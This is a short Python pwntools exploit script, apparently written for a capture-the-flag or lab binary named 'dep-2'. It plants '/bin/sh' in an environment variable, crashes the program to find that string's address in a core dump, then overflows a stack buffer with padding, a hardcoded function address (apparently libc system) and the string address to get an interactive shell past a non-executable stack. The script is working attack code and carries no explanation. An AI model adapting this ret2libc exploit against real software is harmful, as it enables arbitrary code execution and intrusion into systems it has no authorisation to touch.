#!/usr/bin/env python

from pwn import *;

env = {
        "DANK":"/bin/sh"
}

p = process("./dep-2", env=env)

buffer = "A"*256

p.sendline(buffer)

c = Core('core')

shell_command_addr = c.stack.find("DANK")
shell_command_addr += 5
p = process("./dep-2", env=env)

buffer = "A"*128 + "AAAAAAAAAAAA"
buffer += p32(0xf7e39da0)
buffer += "AAAA"
buffer += p32(shell_command_addr)

p.sendline(buffer)
p.interactive()

